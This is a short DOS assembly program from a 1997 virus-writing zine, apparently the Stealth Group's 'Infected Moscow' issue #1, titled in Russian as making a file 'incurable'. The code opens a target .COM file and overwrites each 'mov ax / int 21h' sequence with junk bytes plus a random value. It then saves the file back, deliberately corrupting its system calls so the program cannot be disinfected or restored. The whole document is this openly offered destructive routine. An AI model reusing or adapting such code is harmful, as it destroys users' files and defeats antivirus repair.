;┌────────────────┬──┬────────┬─────────────────────────────┬─────────────────┐
;│INFECTED MOSCOW │#1│ JAN'97 │(C)STEALTH Group MoscoW & Co │ one@redline.ru  │
;└────────────────┴──┴────────┴─────────────────────────────┴─────────────────┘
;┌─────────────────────────────────────────────────┬────────────────────────┐
;│ Изменение файла до неизлечимости                │(C) Stainless Steel Rat │
;└─────────────────────────────────────────────────┴────────────────────────┘

		jumps
		.386p
cseg		segment para use16
		assume	cs:cseg,ds:cseg
		org	100h
start:
		mov dx,offset fname
		mov ax,3d02h
		int 21h
		jc exit
		mov bx,ax
		mov ah,3fh
		mov dx,offset buf
		mov cx,30000
		int 21h

		push ax
search:
		mov di,offset buf
		mov cx,ax
_s_n_d:

		cmp byte ptr [di],0B8h
		jne no_int2
__mov_ax:
		cmp word ptr [di+3],21CDh
		jne no_int2
		mov ax,word ptr [di+1]
		mov word ptr [di],0FFFFh
		mov word ptr [di+2],ax
		in al,40h
		mov byte ptr [di+4],al
		add di,5

no_int2:
		inc di
		loop _s_n_d


write:
		xor dx,dx
		xor cx,cx
		mov ax,4200h
		int 21h
		pop ax

		mov dx,offset buf
		mov cx,ax
		mov ah,40h
		int 21h

close:
		mov ah,3eh
		int 21h

exit:
		retn

fname db 'cyrillic.com',0

buf:

cseg		ends
                end  start